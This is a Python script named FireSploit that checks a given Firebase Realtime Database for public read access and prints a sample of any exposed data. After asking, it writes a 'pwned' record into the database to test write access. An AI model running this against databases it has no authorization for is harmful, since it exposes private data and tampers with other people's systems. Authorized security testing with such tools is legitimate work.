#!/usr/bin/env python3

"""
FireSploit - Firebase Public Access Scanner

Author: Shubham Sharma
GitHub: https://github.com/secshubhamsharma/FireSploit
"""

import requests
import argparse
import json


def check_public_read(database_url: str) -> bool:
    test_url = f"{database_url}/.json"
    print(f"\n[+] Checking public read access: {test_url}")

    try:
        response = requests.get(test_url, timeout=5)
        if response.status_code == 200 and response.json():
            print("[!] Public read access detected.")
            preview = json.dumps(response.json(), indent=2)
            print("[*] Sample response:")
            print(preview[:500] + "...\n")
            return True
        else:
            print("[✓] No public read access.")
            return False
    except requests.exceptions.RequestException as error:
        print(f"[x] Connection error: {error}")
        return False


def try_public_write(database_url: str) -> None:
    payload_url = f"{database_url}/pwned.json"
    payload = {
        "pwned": True,
        "by": "FireSploit",
        "date": "2025-07-04"
    }

    print(f"\n[+] Attempting public write access: {payload_url}")
    try:
        response = requests.put(payload_url, json=payload, timeout=5)
        if response.status_code == 200:
            print("[!] Public write access detected.")
            print("[*] Payload successfully written:")
            print(json.dumps(payload, indent=2))
        else:
            print(f"[✓] Write attempt rejected. Status code: {response.status_code}")
    except requests.exceptions.RequestException as error:
        print(f"[x] Connection error during write attempt: {error}")


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="FireSploit - Firebase public access vulnerability scanner"
    )
    parser.add_argument(
        "--url",
        required=True,
        help="Firebase DB URL (e.g., https://yourapp.firebaseio.com)"
    )
    return parser.parse_args()


def main():
    print("FireSploit Scanner v1.1")
    args = parse_arguments()
    target_url = args.url.rstrip("/")

    if check_public_read(target_url):
        choice = input("[?] Do you want to attempt a write test? (y/N): ").strip().lower()
        if choice == "y":
            try_public_write(target_url)
        else:
            print("[*] Write test skipped.")
    else:
        print("[✓] No public access vulnerabilities detected.")


if __name__ == "__main__":
    main()
